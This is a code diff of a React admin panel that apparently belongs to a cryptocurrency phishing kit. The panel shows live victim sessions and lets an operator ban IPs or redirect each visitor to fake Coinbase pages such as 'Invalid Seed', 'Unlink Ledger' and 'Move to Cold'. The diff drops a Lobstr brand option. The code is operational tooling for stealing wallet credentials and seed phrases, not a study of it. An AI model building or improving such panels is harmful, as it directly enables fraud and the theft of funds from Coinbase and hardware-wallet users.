@@ -4,9 +4,8 @@ import { useAdminSocket } from '../contexts/AdminSocket';
 import notificationSound from './notification.mp3';
 
 const ANIMAL_EMOJIS = [
-  '🦊', '🦁', '🐯', '🐶', '🐱', '🐼', '🐨', '🐮', '🐷', '🐸',
-  '🦄', '🐵', '🐰', '🦒', '🦘', '🦔', '🐻', '🐙', '🦈', '🐬',
-  '🦭', '🦩', '🦥', '🦦', '🦡', '🦃', '🦆', '🦅', '🐺', '🐝'
+  '🐟', '🐠', '🐡','🐙', '🦈', '🐬',
+  '🦭','🦦'
 ];
 
 const DeviceDetectorUtil = {
@@ -53,7 +52,7 @@ const getEmojiForSession = (sessionId) => {
   return ANIMAL_EMOJIS[num % ANIMAL_EMOJIS.length];
 };
 
-const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew, selectedBrand }) => {
+const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew }) => {
   const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
   const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
   const os = DeviceDetectorUtil.detectOS(session.userAgent);
@@ -154,7 +153,6 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
           selectedPage={selectedPage}
           onPageChange={setSelectedPage}
           isHovered={false}
-          selectedBrand={selectedBrand}
         />
         
         <div className="flex items-center space-x-2">
@@ -187,49 +185,35 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
   );
 };
 
-const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selectedBrand }) => {
-  const brandCategories = {
-    Coinbase: {
-      Introduction: [
-        { id: 'loading.html', name: 'Loading' },
-        { id: 'review.html', name: 'Review' },
-        { id: 'estimatedbalance.html', name: 'Estimated Balance' },
-        { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
-      ],
-      'Hardware Wallets': [
-        { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
-        { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
-        { id: 'MoveToCold.html', name: 'Move to Cold' }
-      ],
-      Awaiting: [
-        { id: 'Pendingreview.html', name: 'Pending Review' }
-      ],
-      'Completed Task': [
-        { id: 'Completed.html', name: 'Review Completed' },
-        { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
-      ],
-      Others: [
-        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
-        { id: 'InvalidSeed.html', name: 'Invalid Seed' }
-      ]
-    },
-    Lobstr: {
-      Loading: [
-        { id: 'lobstrloading.html', name: 'Loading' }
-      ],
-      'Account Actions': [
-        { id: 'lobstrreview.html', name: 'Review' },
-        { id: 'lobstrcomplete.html', name: 'Complete' }
-      ]
-    }
-  };
-  
-  const pageCategories = brandCategories[selectedBrand] || brandCategories.Coinbase;
+const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
+  const pageCategories = {
+    Introduction: [
+      { id: 'loading.html', name: 'Loading' },
+      { id: 'review.html', name: 'Review' },
+      { id: 'estimatedbalance.html', name: 'Estimated Balance' },
+      { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
+    ],
+    'Hardware Wallets': [
+      { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
+      { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
+      { id: 'MoveToCold.html', name: 'Move to Cold' }
+    ],
+    Awaiting: [
+      { id: 'Pendingreview.html', name: 'Pending Review' }
+    ],
+    'Completed Task': [
+      { id: 'Completed.html', name: 'Review Completed' },
+      { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
+    ],
+    Others: [
+      { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+      { id: 'InvalidSeed.html', name: 'Invalid Seed' }
+    ]
+  }
 
   return (
     <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
       <select
-        key={selectedBrand}
         value={selectedPage}
         onChange={(e) => onPageChange(e.target.value)}
         style={{ 
@@ -380,7 +364,7 @@ const SessionHeaderRow = () => {
   );
 };
 
-const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand }) => {
+const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
   const { settings } = useAdminSocket();
   const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
   const [isHovered, setIsHovered] = useState(false);
@@ -524,7 +508,6 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
             selectedPage={selectedPage}
             onPageChange={setSelectedPage}
             isHovered={isHovered}
-            selectedBrand={selectedBrand}
           />
 
           <button
@@ -562,7 +545,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
   );
 };
 
-const SessionList = ({ selectedBrand }) => {
+const SessionList = () => {
   // Add settings to the destructured values from useAdminSocket
   const { sessions, banIP, redirectUser, removeSession, settings } = useAdminSocket();
   const [isHovered, setIsHovered] = useState(false);
@@ -641,7 +624,6 @@ const SessionList = ({ selectedBrand }) => {
                   onBan={handleBanIP}
                   onRemove={handleRemoveSession}
                   isNew={newSessions.has(session.id)}
-                  selectedBrand={selectedBrand}
                 />
               ))}
             </div>
@@ -657,7 +639,6 @@ const SessionList = ({ selectedBrand }) => {
             onBan={handleBanIP}
             onRemove={handleRemoveSession}
             isNew={newSessions.has(session.id)}
-            selectedBrand={selectedBrand}
           />
         ))}
       </div>
